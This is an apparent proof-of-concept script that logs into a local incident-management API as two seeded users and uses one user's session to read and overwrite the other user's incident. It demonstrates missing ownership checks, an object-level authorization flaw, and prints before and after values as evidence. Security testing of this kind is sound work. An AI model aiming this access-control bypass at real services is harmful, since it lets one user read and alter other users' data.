import json
import os
import urllib.request
from datetime import datetime, timezone
from http.cookiejar import CookieJar

BASE = "http://localhost:5080"
BOB_ID = "20000000-0000-0000-0000-000000000002"

password = os.environ.get("SeedUsers__Password")
if not password:
    raise SystemExit("SeedUsers__Password is not set")

def send(client, method, path, body=None):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    request = urllib.request.Request(
        BASE + path, data=data, headers=headers, method=method
    )
    with client.open(request, timeout=15) as response:
        content = response.read()
        return response.status, json.loads(content) if content else None

def login(user):
    client = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(CookieJar())
    )
    status, _ = send(client, "POST", "/api/auth/login", {
        "userName": user,
        "password": password
    })
    return client, status

alice, alice_status = login("alice")
bob, bob_status = login("bob")

path = f"/api/incidents/{BOB_ID}"

foreign_status, _ = send(alice, "GET", path)
before_status, before = send(bob, "GET", path)

new_title = "LR04-PoC-" + datetime.now(
    timezone.utc
).strftime("%Y%m%d-%H%M%S")

update_status, _ = send(alice, "PUT", path, {
    "title": new_title,
    "description": "Local synthetic incident update for demonstrating missing resource ownership authorization."
})

after_status, after = send(bob, "GET", path)

print("actor=alice")
print("resource_owner=bob")
print("resource_id=" + BOB_ID)
print("alice_login_status=", alice_status)
print("bob_login_status=", bob_status)
print("alice_foreign_read_status=", foreign_status)
print("bob_before_read_status=", before_status)
print("update_status=", update_status)
print("bob_after_read_status=", after_status)
print("before_title=", before["title"])
print("after_title=", after["title"])
print("state_changed=", before["title"] != after["title"])
